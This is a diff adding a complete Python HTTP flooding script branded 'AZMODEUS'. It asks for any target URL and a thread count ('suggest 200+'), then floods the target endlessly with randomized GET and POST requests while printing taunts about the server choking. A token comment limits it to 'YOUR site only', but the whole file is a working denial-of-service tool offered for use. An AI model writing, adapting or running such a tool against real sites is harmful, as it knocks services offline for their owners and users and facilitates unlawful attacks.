@@ -1,0 +1,79 @@
+import asyncio
+import aiohttp
+import random
+import string
+import os
+import sys
+import time
+from colorama import Fore, Style, init
+from pyfiglet import figlet_format
+
+# Auto-install dependencies
+try:
+    import aiohttp
+except ImportError:
+    os.system(f"{sys.executable} -m pip install aiohttp colorama pyfiglet rich")
+
+init(autoreset=True)
+
+# --- AESTHETIC FUNCTIONS ---
+
+def banner():
+    print(Fore.RED + Style.BRIGHT + figlet_format("AZMODEUS", font="slant"))
+    print(Fore.GREEN + ">>> No one is safe... <<<\n")
+
+def glitch(text):
+    for c in text:
+        sys.stdout.write(Fore.MAGENTA + c + Style.RESET_ALL)
+        sys.stdout.flush()
+        time.sleep(0.02)
+    print()
+
+quotes = [
+    "🔥 Azmodeus has awakened...",
+    "💀 Your walls are burning...",
+    "👁 No one is safe...",
+    "⚡ Shadows consume the server...",
+    "☠ The void stares back..."
+]
+
+def random_quote():
+    print(Fore.YELLOW + random.choice(quotes) + Style.RESET_ALL)
+
+# --- ATTACK LOGIC (for YOUR site only) ---
+
+def random_query(length=8):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+async def attack(session, url):
+    while True:
+        try:
+            if random.choice([True, False]):
+                full_url = f"{url}?Azmodeus={random_query()}"
+                async with session.get(full_url, ssl=False, timeout=20) as resp:
+                    print(Fore.CYAN + f"[GET] {resp.status} from {full_url}")
+            else:
+                payload = {"user": random_query(), "pass": random_query()}
+                async with session.post(url, data=payload, ssl=False, timeout=20) as resp:
+                    print(Fore.MAGENTA + f"[POST] {resp.status} with payload {payload}")
+            if random.randint(1, 20) == 5:
+                random_quote()
+        except asyncio.TimeoutError:
+            print(Fore.RED + "[-] Timeout (server choking 😏)")
+        except Exception as e:
+            print(Fore.RED + f"[-] Error: {e}")
+
+async def main():
+    banner()
+    glitch("Azmodeus is here... No one is safe.\n")
+    url = input(Fore.CYAN + "Enter target (include http/https): ").strip()
+    threads = int(input(Fore.CYAN + "Threads (suggest 200+): "))
+    async with aiohttp.ClientSession() as session:
+        tasks = [attack(session, url) for _ in range(threads)]
+        await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(Fore.RED + Style.BRIGHT + "\n[☠] AZMODEUS RETURNS TO THE VOID...")
